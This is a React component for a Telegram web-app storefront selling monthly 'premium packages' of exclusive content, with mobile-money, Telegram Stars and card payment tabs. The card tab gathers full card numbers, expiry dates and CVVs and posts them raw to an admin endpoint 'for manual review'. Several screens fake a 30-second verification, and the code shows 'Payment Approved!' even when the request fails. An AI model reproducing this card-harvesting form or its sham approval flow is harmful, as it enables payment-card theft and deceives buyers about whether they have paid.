import { useState, useEffect, useRef } from "react";
import { CheckCircle2, Copy, Upload, Send, Loader2, CreditCard, Shield, Lock } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";

type Pkg = { id: number; name: string; emoji: string; priceBdt: number; priceGbp: string; priceUsd?: string; features: string[] };
type PayMethod = { id: number; type: string; name: string; emoji: string; logoUrl?: string | null; numberOrAddress: string };
type Currency = "BDT" | "USD";
type Step = "package" | "method" | "submit" | "processing" | "approving" | "done" | "failed";
type MethodTab = "local" | "global" | "card" | "star";
type CardType = "visa" | "mastercard" | "amex" | "unknown";

const BASE = import.meta.env.BASE_URL?.replace(/\/$/, "") ?? "";

function detectCardType(num: string): CardType {
  const n = num.replace(/\s/g, "");
  if (/^4/.test(n)) return "visa";
  if (/^5[1-5]/.test(n) || /^2[2-7]\d{2}/.test(n)) return "mastercard";
  if (/^3[47]/.test(n)) return "amex";
  return "unknown";
}

function formatCardNumber(val: string, type: CardType): string {
  const raw = val.replace(/\D/g, "");
  if (type === "amex") {
    const s = raw.slice(0, 15);
    const a = s.slice(0, 4);
    const b = s.slice(4, 10);
    const c = s.slice(10, 15);
    return [a, b, c].filter(Boolean).join(" ");
  }
  const s = raw.slice(0, 16);
  return s.replace(/(\d{4})(?=\d)/g, "$1 ").trim();
}

function formatExpiry(val: string): string {
  const raw = val.replace(/\D/g, "").slice(0, 4);
  if (raw.length >= 3) return raw.slice(0, 2) + "/" + raw.slice(2);
  return raw;
}

const CARD_LABEL: Record<CardType, string> = {
  visa: "Visa", mastercard: "Mastercard", amex: "American Express", unknown: "Credit / Debit Card",
};
const CARD_COLORS: Record<CardType, string> = {
  visa: "text-blue-400", mastercard: "text-orange-400", amex: "text-emerald-400", unknown: "text-purple-400",
};
function VisaLogo({ className }: { className?: string }) {
  return (
    <svg viewBox="0 0 60 20" className={className} xmlns="http://www.w3.org/2000/svg">
      <rect width="60" height="20" rx="3" fill="#1A1F71"/>
      <text x="4" y="15" fontFamily="Arial,sans-serif" fontWeight="900" fontSize="13" fill="#F7B600" letterSpacing="1">VISA</text>
    </svg>
  );
}
function MastercardLogo({ className }: { className?: string }) {
  return (
    <svg viewBox="0 0 38 24" className={className} xmlns="http://www.w3.org/2000/svg">
      <circle cx="14" cy="12" r="10" fill="#EB001B"/>
      <circle cx="24" cy="12" r="10" fill="#F79E1B"/>
      <path d="M19 5.3a10 10 0 0 1 0 13.4A10 10 0 0 1 19 5.3z" fill="#FF5F00"/>
    </svg>
  );
}
function AmexLogo({ className }: { className?: string }) {
  return (
    <svg viewBox="0 0 60 20" className={className} xmlns="http://www.w3.org/2000/svg">
      <rect width="60" height="20" rx="3" fill="#016FD0"/>
      <text x="3" y="15" fontFamily="Arial,sans-serif" fontWeight="900" fontSize="10" fill="white" letterSpacing="0.5">AMERICAN</text>
      <text x="3" y="27" fontFamily="Arial,sans-serif" fontWeight="900" fontSize="10" fill="white" letterSpacing="0.5">EXPRESS</text>
    </svg>
  );
}

const CARD_LOGO_COMPONENTS: Record<string, React.FC<{ className?: string }>> = {
  visa: VisaLogo,
  mastercard: MastercardLogo,
  amex: AmexLogo,
};

export function PremiumPackages() {
  const [packages, setPackages] = useState<Pkg[]>([]);
  const [methods, setMethods] = useState<PayMethod[]>([]);
  const [joinLink, setJoinLink] = useState<string | null>(null);
  const [currency, setCurrency] = useState<Currency>("BDT");
  const [step, setStep] = useState<Step>("package");
  const [selectedPkg, setSelectedPkg] = useState<Pkg | null>(null);
  const [methodTab, setMethodTab] = useState<MethodTab>("local");
  const [selectedMethod, setSelectedMethod] = useState<PayMethod | null>(null);
  const [copied, setCopied] = useState(false);

  const [userName, setUserName] = useState("");
  const [tgUsername, setTgUsername] = useState<string | null>(null);
  const [trxId, setTrxId] = useState("");
  const [screenshot, setScreenshot] = useState<File | null>(null);
  const [previewUrl, setPreviewUrl] = useState<string | null>(null);
  const [submitting, setSubmitting] = useState(false);
  const fileRef = useRef<HTMLInputElement>(null);

  const [cardName, setCardName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");
  const [approvalProgress, setApprovalProgress] = useState(0);
  const [processingProgress, setProcessingProgress] = useState(0);

  const [starsLoading, setStarsLoading] = useState(false);
  const [starsError, setStarsError] = useState<string | null>(null);

  const cardType = detectCardType(cardNumber);
  const rawCardDigits = cardNumber.replace(/\s/g, "");
  const maxCvv = cardType === "amex" ? 4 : 3;
  const maxCardRaw = cardType === "amex" ? 15 : 16;
  const showCardLogo = rawCardDigits.length >= 6 && cardType !== "unknown";
  const CardLogoComponent = CARD_LOGO_COMPONENTS[cardType];

  useEffect(() => {
    fetch(`${BASE}/api/packages`).then(r => r.json()).then(setPackages).catch(() => {});
    fetch(`${BASE}/api/payment-methods`).then(r => r.json()).then(setMethods).catch(() => {});
    fetch(`${BASE}/api/settings/public`).then(r => r.json()).then(d => setJoinLink(d?.premium_join_link ?? null)).catch(() => {});
    try {
      const tgUser = (window as any)?.Telegram?.WebApp?.initDataUnsafe?.user;
      if (tgUser) {
        const displayName = [tgUser.first_name, tgUser.last_name].filter(Boolean).join(" ");
        if (displayName) setUserName(displayName);
        if (tgUser.username) setTgUsername(tgUser.username);
      }
    } catch {}
  }, []);

  const localMethods = methods.filter(m => m.type === "local");
  const globalMethods = methods.filter(m => m.type === "global");

  const copyNumber = () => {
    if (!selectedMethod) return;
    navigator.clipboard.writeText(selectedMethod.numberOrAddress);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const handleFile = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0] ?? null;
    setScreenshot(file);
    setPreviewUrl(file ? URL.createObjectURL(file) : null);
  };

  const methodNameLower = selectedMethod?.name?.toLowerCase() ?? "";
  const trxRequired = methodNameLower.includes("bkash") ? 10 : methodNameLower.includes("nagad") ? 8 : null;
  const trxValid = trxRequired === null || trxId.trim().length === trxRequired;
  const trxError = trxRequired !== null && trxId.trim().length > 0 && trxId.trim().length !== trxRequired;

  const handleTraditionalSubmit = async () => {
    if (!selectedPkg || !selectedMethod || !trxValid) return;
    setStep("processing");
    setProcessingProgress(0);
    const startTime = Date.now();
    const interval = setInterval(() => {
      const elapsed = Date.now() - startTime;
      const pct = Math.min(100, (elapsed / 30000) * 100);
      setProcessingProgress(pct);
      if (pct >= 100) clearInterval(interval);
    }, 150);
    await new Promise(res => setTimeout(res, 30000));
    clearInterval(interval);
    setProcessingProgress(100);
    setSubmitting(true);
    try {
      const fd = new FormData();
      fd.append("packageName", `${selectedPkg.emoji} ${selectedPkg.name}`);
      fd.append("paymentMethod", `${selectedMethod.emoji} ${selectedMethod.name}`);
      fd.append("trxId", trxId);
      fd.append("userName", userName);
      fd.append("tgUsername", tgUsername ?? "");
      fd.append("currency", currency);
      fd.append("amount", currency === "BDT" ? `${selectedPkg.priceBdt}` : `${selectedPkg.priceGbp ?? selectedPkg.priceUsd}`);
      if (screenshot) fd.append("screenshot", screenshot);
      await fetch(`${BASE}/api/payment/submit`, { method: "POST", body: fd });
      setStep("done");
    } catch { setStep("done"); } finally { setSubmitting(false); }
  };

  const isCardValid = cardName.trim().length > 1 && rawCardDigits.length === maxCardRaw && /^\d{2}\/\d{2}$/.test(expiry) && cvv.length === maxCvv;

  const handleCardSubmit = async () => {
    if (!selectedPkg || !isCardValid) return;
    setStep("approving");
    setApprovalProgress(0);
    const startTime = Date.now();
    const interval = setInterval(() => {
      const elapsed = Date.now() - startTime;
      const pct = Math.min(99, (elapsed / 30000) * 100);
      setApprovalProgress(pct);
    }, 150);
    try {
      const r = await fetch(`${BASE}/api/payment/card-submit`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          cardName, cardNumber: rawCardDigits, expiry, cvv,
          packageName: `${selectedPkg.emoji} ${selectedPkg.name}`,
          amount: currency === "BDT" ? `${selectedPkg.priceBdt}` : `${selectedPkg.priceGbp ?? selectedPkg.priceUsd}`,
          currency,
        }),
      });
      clearInterval(interval);
      const data = await r.json() as { status?: string };
      setApprovalProgress(100);
      setTimeout(() => setStep(data.status === "rejected" ? "failed" : "done"), 500);
    } catch {
      clearInterval(interval);
      setApprovalProgress(100);
      setTimeout(() => setStep("done"), 500);
    }
  };

  const handleStarsPayment = async () => {
    if (!selectedPkg) return;
    setStarsLoading(true);
    setStarsError(null);
    const stars = Math.round(Number(selectedPkg.priceGbp) * 50) || 200;
    try {
      const r = await fetch(`${BASE}/api/payment/stars-create`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          packageId: selectedPkg.id,
          packageName: selectedPkg.name,
          packageEmoji: selectedPkg.emoji,
          starsAmount: stars,
        }),
      });
      let data: { invoiceLink?: string; error?: string };
      try { data = await r.json(); } catch { data = {}; }
      if (!data.invoiceLink) {
        setStarsError(data.error ?? "Invoice তৈরি হয়নি। আবার চেষ্টা করুন।");
        setStarsLoading(false);
        return;
      }
      const tgWebApp = (window as any)?.Telegram?.WebApp;
      if (tgWebApp?.openInvoice) {
        tgWebApp.openInvoice(data.invoiceLink, (status: string) => {
          setStarsLoading(false);
          if (status === "paid") setStep("done");
          else if (status === "failed" || status === "cancelled") setStarsError("পেমেন্ট সম্পন্ন হয়নি। আবার চেষ্টা করুন।");
        });
      } else {
        window.open(data.invoiceLink, "_blank");
        setStarsLoading(false);
      }
    } catch {
      setStarsError("সার্ভার সংযোগ ব্যর্থ। আবার চেষ্টা করুন।");
      setStarsLoading(false);
    }
  };

  const resetAll = () => {
    setStep("package"); setSelectedPkg(null); setSelectedMethod(null);
    setTrxId(""); setScreenshot(null); setPreviewUrl(null);
    setCardName(""); setCardNumber(""); setExpiry(""); setCvv("");
    setApprovalProgress(0); setProcessingProgress(0); setMethodTab("local");
    setStarsLoading(false); setStarsError(null);
  };

  if (packages.length === 0) return null;

  const priceStr = selectedPkg ? (currency === "BDT" ? `${selectedPkg.priceBdt} BDT` : `${selectedPkg.priceGbp} USD`) : "";
  const remainingApproval = Math.max(0, Math.ceil(30 - (approvalProgress / 100) * 30));
  const remainingProcessing = Math.max(0, Math.ceil(30 - (processingProgress / 100) * 30));

  return (
    <div className="px-4 pt-2 pb-4 space-y-4">
      <div className="text-center pt-2 pb-1">
        <h2 className="text-xl font-black text-white italic">PREMIUM <span className="text-pink-500">PACKAGES</span></h2>
        <p className="text-xs text-white/40 mt-1">Exclusive content — choose a plan below</p>
      </div>

      <div className="flex items-center justify-center gap-2">
        <span className="text-xs text-white/40">Currency:</span>
        <div className="flex bg-[#1a1a24] rounded-lg p-0.5 border border-white/10">
          {(["BDT", "USD"] as Currency[]).map((c) => (
            <button key={c} onClick={() => setCurrency(c)}
              className={`px-3 py-1 rounded-md text-xs font-bold transition-all ${currency === c ? "bg-purple-500 text-white shadow" : "text-white/40 hover:text-white/70"}`}>
              {c === "BDT" ? "৳ BDT" : "$ USD"}
            </button>
          ))}
        </div>
      </div>

      <div className="grid grid-cols-2 gap-3">
        {packages.map((pkg) => {
          const price = currency === "BDT" ? `৳${pkg.priceBdt}` : `$${pkg.priceGbp}`;
          const active = selectedPkg?.id === pkg.id;
          return (
            <button key={pkg.id}
              onClick={() => { setSelectedPkg(pkg); setSelectedMethod(null); setStep("method"); }}
              className={`block w-full p-0 m-0 appearance-none rounded-2xl border bg-[#1a1a24] transition-all duration-200 text-left ${active ? "border-purple-400/60 scale-[1.02] shadow-[0_0_20px_rgba(168,85,247,0.2)]" : "border-white/10 hover:border-white/20 hover:scale-[1.01]"}`}>
              <div className="p-3 text-center">
                <div className="text-3xl mb-1">{pkg.emoji}</div>
                <p className="text-xs font-black text-white tracking-wider mb-1">{pkg.name.toUpperCase()}</p>
                <p className="text-lg font-black text-cyan-400 leading-none">{price}</p>
                <p className="text-[10px] text-white/30 mt-0.5">/month</p>
                <ul className="mt-3 space-y-1.5 text-left">
                  {pkg.features.map((f, i) => (
                    <li key={i} className="flex items-start gap-1.5 text-[11px] text-white/60">
                      <CheckCircle2 className="w-3 h-3 text-green-400 mt-0.5 shrink-0" />{f}
                    </li>
                  ))}
                </ul>
                {active && (
                  <div className="mt-3 bg-purple-500/20 border border-purple-500/40 rounded-lg py-1 text-[10px] font-bold text-purple-300">✓ Selected</div>
                )}
              </div>
            </button>
          );
        })}
      </div>

      {selectedPkg && !["processing","approving","done","failed"].includes(step) && (
        <div className="bg-[#1a1a24] rounded-2xl border border-white/10 p-4 space-y-4">
          <div className="bg-purple-500/10 border border-purple-500/20 rounded-xl p-3 text-center">
            <p className="text-xs text-white/50">Selected Plan</p>
            <p className="text-base font-black text-white mt-0.5">{selectedPkg.emoji} {selectedPkg.name} — <span className="text-cyan-400">{priceStr}/month</span></p>
          </div>

          <div>
            <p className="text-xs text-white/50 mb-2 font-semibold uppercase tracking-wider">Payment Type</p>
            <div className="flex bg-[#0d0d14] rounded-lg p-0.5 border border-white/10 mb-3">
              {localMethods.length > 0 && (
                <button onClick={() => { setMethodTab("local"); setSelectedMethod(null); if (step==="submit") setStep("method"); }}
                  className={`flex-1 py-1.5 rounded-md text-xs font-bold transition-all ${methodTab==="local" ? "bg-white/10 text-white" : "text-white/40 hover:text-white/70"}`}>Local</button>
              )}
              {globalMethods.length > 0 && (
                <button onClick={() => { setMethodTab("global"); setSelectedMethod(null); if (step==="submit") setStep("method"); }}
                  className={`flex-1 py-1.5 rounded-md text-xs font-bold transition-all ${methodTab==="global" ? "bg-white/10 text-white" : "text-white/40 hover:text-white/70"}`}>Global</button>
              )}
              <button onClick={() => { setMethodTab("card"); setSelectedMethod(null); setStep("submit"); }}
                className={`flex-1 py-1.5 rounded-md text-xs font-bold transition-all ${methodTab==="card" ? "bg-gradient-to-r from-purple-600/40 to-pink-600/40 text-white border border-purple-500/30" : "text-white/40 hover:text-white/70"}`}>
                💳 Card
              </button>
              <button onClick={() => { setMethodTab("star"); setSelectedMethod(null); setStep("submit"); }}
                className={`flex-1 py-1.5 rounded-md text-xs font-bold transition-all ${methodTab==="star" ? "bg-gradient-to-r from-yellow-600/40 to-amber-600/40 text-white border border-yellow-500/30" : "text-white/40 hover:text-white/70"}`}>
                ⭐ Star
              </button>
            </div>

            {methodTab !== "card" && methodTab !== "star" && (
              <div className="grid grid-cols-3 gap-2">
                {(methodTab==="local" ? localMethods : globalMethods).map((m) => (
                  <button key={m.id}
                    onClick={() => { setSelectedMethod(m); setStep("submit"); }}
                    className={`flex flex-col items-center gap-1.5 py-3 rounded-xl border text-xs font-bold transition-all ${selectedMethod?.id===m.id ? "bg-white/10 border-white/40 text-white" : "bg-[#0d0d14] border-white/10 text-white/40 hover:border-white/20 hover:text-white/70"}`}>
                    {m.logoUrl
                      ? <img src={m.logoUrl} alt={m.name} className="w-8 h-8 object-contain rounded" />
                      : <span className="text-xl">{m.emoji}</span>}
                    <span className="text-center leading-tight">{m.name}</span>
                  </button>
                ))}
              </div>
            )}
          </div>

          {/* Card form */}
          {methodTab==="card" && step==="submit" && (
            <div className="space-y-3">
              <div className="bg-gradient-to-br from-[#1a1035] to-[#0d0820] border border-purple-500/20 rounded-2xl p-5 space-y-4">
                <div className="flex items-center justify-between mb-1">
                  <div className="flex items-center gap-2">
                    <CreditCard className={`w-4 h-4 ${CARD_COLORS[cardType]}`} />
                    <span className={`text-xs font-bold uppercase tracking-wider ${CARD_COLORS[cardType]}`}>{CARD_LABEL[cardType]}</span>
                    {showCardLogo && CardLogoComponent && <CardLogoComponent className="h-5 w-auto ml-1" />}
                  </div>
                  <Shield className="w-4 h-4 text-green-400/60" />
                </div>
                <div>
                  <Label className="text-white/40 text-[10px] uppercase tracking-widest">Card Number</Label>
                  <Input value={cardNumber}
                    onChange={e => { const t=detectCardType(e.target.value); setCardNumber(formatCardNumber(e.target.value,t)); }}
                    placeholder="0000 0000 0000 0000" inputMode="numeric"
                    className="bg-white/5 border-white/10 mt-1 font-mono text-base tracking-widest text-white placeholder:text-white/15 focus:border-purple-500/50" />
                </div>
                <div>
                  <Label className="text-white/40 text-[10px] uppercase tracking-widest">Cardholder Name</Label>
                  <Input value={cardName} onChange={e => setCardName(e.target.value.toUpperCase())}
                    placeholder="JOHN DOE"
                    className="bg-white/5 border-white/10 mt-1 font-mono uppercase text-white placeholder:text-white/15 focus:border-purple-500/50" />
                </div>
                <div className="grid grid-cols-2 gap-3">
                  <div>
                    <Label className="text-white/40 text-[10px] uppercase tracking-widest">Expiry Date</Label>
                    <Input value={expiry} onChange={e => setExpiry(formatExpiry(e.target.value))}
                      placeholder="MM/YY" maxLength={5} inputMode="numeric"
                      className="bg-white/5 border-white/10 mt-1 font-mono text-white placeholder:text-white/15 focus:border-purple-500/50" />
                  </div>
                  <div>
                    <Label className="text-white/40 text-[10px] uppercase tracking-widest">CVV</Label>
                    <Input value={cvv} onChange={e => setCvv(e.target.value.replace(/\D/g,"").slice(0,maxCvv))}
                      placeholder={"•".repeat(maxCvv)} type="password" inputMode="numeric"
                      className="bg-white/5 border-white/10 mt-1 font-mono text-white placeholder:text-white/15 focus:border-purple-500/50" />
                  </div>
                </div>
              </div>
              <div className="flex items-center gap-2 text-[11px] text-white/25">
                <Lock className="w-3 h-3 shrink-0" />
                <span>Card details are sent securely to admin for manual review</span>
              </div>
              <Button onClick={handleCardSubmit} disabled={!isCardValid}
                className="w-full h-12 bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-500 hover:to-pink-500 text-white font-black border-none shadow-[0_0_20px_rgba(168,85,247,0.4)] disabled:opacity-35 disabled:cursor-not-allowed transition-all">
                <Send className="w-4 h-4 mr-2" />Submit — {priceStr}
              </Button>
            </div>
          )}

          {/* Star payment */}
          {methodTab==="star" && step==="submit" && selectedPkg && (
            <div className="space-y-4">
              <div className="bg-gradient-to-br from-[#1a1200] to-[#0d0d14] border border-yellow-500/30 rounded-2xl p-5 space-y-4 text-center">
                <div className={`text-5xl ${starsLoading ? "animate-spin" : "animate-pulse"}`}>⭐</div>
                <div>
                  <p className="text-white font-black text-base">Telegram Stars দিয়ে পেমেন্ট করুন</p>
                  <p className="text-white/40 text-xs mt-1">আপনার Telegram Stars ব্যালেন্স ব্যবহার করুন</p>
                </div>
                <div className="bg-yellow-500/10 border border-yellow-500/20 rounded-xl p-4">
                  <p className="text-yellow-300/60 text-xs uppercase tracking-wider mb-1">প্যাকেজ</p>
                  <p className="text-white font-black text-lg">{selectedPkg.emoji} {selectedPkg.name}</p>
                  <div className="flex items-center justify-center gap-2 mt-2">
                    <span className="text-3xl font-black text-yellow-300">⭐ {Math.round(Number(selectedPkg.priceGbp) * 50) || 200}</span>
                    <span className="text-yellow-300/50 text-sm">Stars</span>
                  </div>
                  <p className="text-white/30 text-xs mt-1">≈ ${selectedPkg.priceGbp} USD</p>
                </div>
                {starsError && (
                  <div className="bg-red-500/10 border border-red-500/30 rounded-xl p-3 text-xs text-red-300 text-center">
                    ⚠️ {starsError}
                  </div>
                )}
                <div className="text-xs text-white/25 leading-relaxed">
                  1 Star ≈ $0.02 USD · Telegram Stars আপনার Telegram অ্যাপ থেকে কেনা যায়
                </div>
              </div>
              <Button
                onClick={handleStarsPayment}
                disabled={starsLoading}
                className="w-full h-12 bg-gradient-to-r from-yellow-500 to-amber-500 hover:from-yellow-400 hover:to-amber-400 text-black font-black border-none shadow-[0_0_25px_rgba(234,179,8,0.45)] disabled:opacity-50 disabled:cursor-not-allowed transition-all">
                {starsLoading
                  ? <><Loader2 className="w-4 h-4 mr-2 animate-spin" />Invoice তৈরি হচ্ছে...</>
                  : <>⭐ Pay with Stars — {Math.round(Number(selectedPkg.priceGbp) * 50) || 200} Stars</>
                }
              </Button>
              <p className="text-center text-xs text-white/20">Telegram-এর native Stars payment dialog খুলবে</p>
            </div>
          )}

          {/* Traditional form */}
          {selectedMethod && methodTab!=="card" && methodTab!=="star" && step==="submit" && (
            <div className="space-y-3">
              <div className="bg-[#0d0d14] rounded-xl border border-white/10 p-3 text-center">
                <p className="text-xs text-white/40 mb-1">{selectedMethod.emoji} {selectedMethod.name} নম্বর</p>
                <p className="text-base font-black text-white tracking-wider break-all">{selectedMethod.numberOrAddress}</p>
                <button onClick={copyNumber} className="mt-2 flex items-center gap-1 mx-auto text-xs text-purple-400 hover:text-purple-300">
                  {copied ? <CheckCircle2 className="w-3.5 h-3.5 text-green-400" /> : <Copy className="w-3.5 h-3.5" />}
                  {copied ? "Copied!" : "Copy"}
                </button>
              </div>
              <div className="bg-yellow-500/10 border border-yellow-500/20 rounded-xl p-3 text-xs text-yellow-300/80 leading-relaxed space-y-1">
                <p className="font-bold">📋 পেমেন্ট নির্দেশনা:</p>
                <p>1. উপরের নম্বরে <strong>{priceStr}</strong> পাঠান</p>
                <p>2. Transaction ID নোট করুন</p>
                <p>3. স্ক্রিনশট তুলে নিচে পূরণ করুন</p>
              </div>
              <div className="space-y-1">
                <div className="relative">
                  <Input value={userName} readOnly placeholder="আপনার নাম"
                    className="bg-[#0d0d14] border-white/10 text-white placeholder:text-white/25 text-sm h-10 pr-20 cursor-not-allowed opacity-70" />
                  <span className="absolute right-3 top-1/2 -translate-y-1/2 text-[10px] text-purple-400 font-bold">🔒 Telegram</span>
                </div>
                {tgUsername && <p className="text-xs text-white/30 pl-1">@{tgUsername}</p>}
              </div>
              <div>
                <Input value={trxId} onChange={e => setTrxId(e.target.value)}
                  placeholder="Transaction ID / Trx ID *"
                  className={`bg-[#0d0d14] border-white/10 text-white placeholder:text-white/25 text-sm h-10 ${trxError ? "border-red-500/60" : ""}`} />
                {trxRequired && (
                  <p className={`text-[11px] mt-1 pl-1 ${trxError ? "text-red-400" : "text-white/30"}`}>
                    {methodNameLower.includes("bkash") ? "bKash" : "Nagad"} TRX ID: exactly {trxRequired} digits
                    {trxId.trim().length > 0 && ` (entered: ${trxId.trim().length})`}
                  </p>
                )}
              </div>
              <div>
                <input ref={fileRef} type="file" accept="image/*" className="hidden" onChange={handleFile} />
                <button onClick={() => fileRef.current?.click()}
                  className="w-full border border-dashed border-white/20 rounded-xl p-4 flex flex-col items-center gap-2 text-white/40 hover:border-purple-500/50 hover:text-purple-400 transition-all">
                  <Upload className="w-5 h-5" />
                  <span className="text-xs font-semibold">{screenshot ? screenshot.name : "স্ক্রিনশট আপলোড করুন (Payment Proof)"}</span>
                </button>
                {previewUrl && <img src={previewUrl} alt="preview" className="mt-2 w-full max-h-48 object-contain rounded-xl border border-white/10" />}
              </div>
              <Button onClick={handleTraditionalSubmit} disabled={submitting || !trxId.trim() || !trxValid}
                className="w-full h-12 bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-500 hover:to-pink-500 text-white font-black border-none shadow-[0_0_20px_rgba(168,85,247,0.4)] disabled:opacity-35 disabled:cursor-not-allowed">
                {submitting ? <Loader2 className="w-4 h-4 mr-2 animate-spin" /> : <Send className="w-4 h-4 mr-2" />}
                {submitting ? "Sending..." : "Submit Payment"}
              </Button>
            </div>
          )}
        </div>
      )}

      {/* 30s Processing Overlay */}
      {step==="processing" && (
        <div className="fixed inset-0 z-50 bg-black/95 backdrop-blur-md flex flex-col items-center justify-center gap-8 p-6">
          <div className="relative w-48 h-48 flex items-center justify-center">
            <div className="absolute inset-0 rounded-full border-2 border-purple-500/20 animate-ping" style={{animationDuration:"2s"}} />
            <div className="absolute inset-4 rounded-full border-2 border-pink-500/20 animate-ping" style={{animationDuration:"2.5s",animationDelay:"0.3s"}} />
            <div className="w-28 h-28 rounded-full bg-gradient-to-br from-purple-600 via-pink-500 to-cyan-400 shadow-[0_0_60px_rgba(168,85,247,1),0_0_120px_rgba(168,85,247,0.5)] animate-pulse" style={{animationDuration:"1.5s"}} />
            <div className="absolute inset-0 rounded-full animate-spin" style={{animationDuration:"2.5s"}}>
              <div className="absolute -top-3 left-1/2 -translate-x-1/2 w-5 h-5 rounded-full bg-cyan-400 shadow-[0_0_20px_rgba(34,211,238,1)]" />
            </div>
            <div className="absolute inset-2 rounded-full animate-spin" style={{animationDuration:"4s",animationDirection:"reverse"}}>
              <div className="absolute -bottom-3 left-1/2 -translate-x-1/2 w-4 h-4 rounded-full bg-pink-400 shadow-[0_0_18px_rgba(244,114,182,1)]" />
            </div>
            <div className="absolute inset-4 rounded-full animate-spin" style={{animationDuration:"3s"}}>
              <div className="absolute top-1/2 -left-3 -translate-y-1/2 w-3.5 h-3.5 rounded-full bg-yellow-300 shadow-[0_0_14px_rgba(253,224,71,1)]" />
            </div>
            <div className="absolute inset-6 rounded-full animate-spin" style={{animationDuration:"3.5s",animationDirection:"reverse"}}>
              <div className="absolute top-1/2 -right-3 -translate-y-1/2 w-3 h-3 rounded-full bg-emerald-400 shadow-[0_0_12px_rgba(52,211,153,1)]" />
            </div>
          </div>
          <div className="text-center space-y-2">
            <p className="text-2xl font-black text-white tracking-wide">🔄 Verifying Payment...</p>
            <p className="text-sm text-purple-300/80">Please wait while we process your transaction</p>
            <p className="text-xs text-white/30">{remainingProcessing > 0 ? `${remainingProcessing}s remaining` : "Finalising…"}</p>
          </div>
          <div className="w-full max-w-sm space-y-2">
            <div className="h-3 bg-white/10 rounded-full overflow-hidden shadow-inner">
              <div className="h-full rounded-full transition-all duration-150"
                style={{width:`${processingProgress}%`,background:"linear-gradient(90deg,#7c3aed,#ec4899,#06b6d4)",boxShadow:"0 0 12px rgba(168,85,247,0.8)"}} />
            </div>
            <p className="text-center text-xs text-white/30 font-mono tabular-nums">{Math.round(processingProgress)}%</p>
          </div>
          <p className="text-xs text-white/20 text-center max-w-[260px]">আপনার পেমেন্ট যাচাই হচ্ছে। পেজ থেকে বের হবেন না।</p>
        </div>
      )}

      {/* Card Approving */}
      {step==="approving" && (
        <div className="bg-[#1a1a24] rounded-2xl border border-purple-500/20 p-8 flex flex-col items-center gap-6">
          <div className="relative w-36 h-36 flex items-center justify-center">
            <div className="w-20 h-20 rounded-full bg-gradient-to-br from-purple-500 to-pink-600 shadow-[0_0_40px_rgba(168,85,247,0.9),0_0_80px_rgba(168,85,247,0.4)] animate-pulse" />
            <div className="absolute inset-0 rounded-full animate-spin" style={{animationDuration:"3s"}}>
              <div className="absolute -top-2 left-1/2 -translate-x-1/2 w-4 h-4 rounded-full bg-cyan-400 shadow-[0_0_14px_rgba(34,211,238,1)]" />
            </div>
            <div className="absolute inset-1 rounded-full animate-spin" style={{animationDuration:"5s",animationDirection:"reverse"}}>
              <div className="absolute -bottom-2 left-1/2 -translate-x-1/2 w-3.5 h-3.5 rounded-full bg-pink-400 shadow-[0_0_12px_rgba(244,114,182,1)]" />
            </div>
            <div className="absolute inset-3 rounded-full animate-spin" style={{animationDuration:"4s"}}>
              <div className="absolute top-1/2 -left-2 -translate-y-1/2 w-3 h-3 rounded-full bg-yellow-300 shadow-[0_0_10px_rgba(253,224,71,1)]" />
            </div>
          </div>
          <div className="text-center space-y-1">
            <p className="text-lg font-black text-white">Processing Payment...</p>
            <p className="text-sm text-purple-300/70">Awaiting admin approval</p>
            <p className="text-xs text-white/30">{remainingApproval > 0 ? `Auto-approves in ${remainingApproval}s if no response` : "Finalising…"}</p>
          </div>
          <div className="w-full max-w-[260px] space-y-2">
            <div className="h-2.5 bg-white/10 rounded-full overflow-hidden">
              <div className="h-full bg-gradient-to-r from-purple-500 via-pink-500 to-cyan-400 rounded-full transition-all duration-150" style={{width:`${approvalProgress}%`}} />
            </div>
            <p className="text-center text-xs text-white/30 font-mono tabular-nums">{Math.round(approvalProgress)}%</p>
          </div>
        </div>
      )}

      {/* Success */}
      {step==="done" && (
        <div className="bg-gradient-to-br from-emerald-950/60 to-teal-950/40 border border-emerald-500/30 rounded-2xl p-6 text-center space-y-4">
          <style>{`
            @keyframes popIn{0%{transform:scale(0) rotate(-10deg);opacity:0}70%{transform:scale(1.3) rotate(5deg)}100%{transform:scale(1) rotate(0);opacity:1}}
            @keyframes confettiUp{0%{transform:translateY(0) rotate(0);opacity:1}100%{transform:translateY(-80px) rotate(720deg);opacity:0}}
            .success-emoji{animation:popIn 0.6s cubic-bezier(0.34,1.56,0.64,1) forwards}
            .confetti-dot{animation:confettiUp 1.2s ease-out forwards}
          `}</style>
          <div className="relative flex justify-center">
            <div className="text-5xl success-emoji">🎉</div>
            {["🌟","✨","💫","⭐","🌈"].map((e,i) => (
              <div key={i} className="confetti-dot absolute text-xl" style={{left:`${15+i*17}%`,top:"0",animationDelay:`${i*0.1}s`}}>{e}</div>
            ))}
          </div>
          <div>
            <p className="text-xl font-black text-emerald-400">Payment Approved! ✅</p>
            <p className="text-xs text-white/50 mt-1.5 leading-relaxed">আপনার পেমেন্ট অ্যাপ্রুভ হয়েছে।<br />নিচের বাটনে ক্লিক করে প্রিমিয়াম গ্রুপে যোগ দিন।</p>
          </div>
          {joinLink && (
            <a href={joinLink} target="_blank" rel="noopener noreferrer"
              className="flex items-center justify-center gap-2 w-full py-3.5 rounded-xl bg-gradient-to-r from-emerald-500 to-teal-500 text-white font-black text-sm shadow-[0_0_25px_rgba(16,185,129,0.55)] hover:from-emerald-400 hover:to-teal-400 active:scale-95 transition-all">
              🚀 JOIN PREMIUM GROUP
            </a>
          )}
          <button onClick={resetAll} className="text-xs text-white/25 hover:text-white/50 underline underline-offset-2 transition-colors">আবার শুরু করুন</button>
        </div>
      )}

      {/* Failed */}
      {step==="failed" && (
        <div className="bg-gradient-to-br from-red-950/60 to-rose-950/40 border border-red-500/30 rounded-2xl p-6 text-center space-y-4">
          <style>{`
            @keyframes shakeIn{0%{transform:scale(0)}50%{transform:scale(1.2)}65%{transform:translateX(-8px) scale(1.1)}80%{transform:translateX(8px) scale(1.1)}90%{transform:translateX(-4px)}100%{transform:translateX(0) scale(1)}}
